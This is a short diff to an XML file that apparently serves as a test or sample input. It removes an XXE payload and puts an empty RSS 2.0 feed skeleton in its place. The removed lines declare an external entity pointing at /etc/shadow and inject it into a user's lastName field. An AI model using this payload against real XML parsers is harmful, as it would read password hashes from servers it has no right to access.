@@ -1,7 +1,7 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
-<userInfo>
-  <firstName>John</firstName>
-  <lastName>&ent;</lastName>
-</userInfo>
-
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" version="2.0">
+   <channel>
+      <item>
+      </item>
+   </channel>
+</rss>
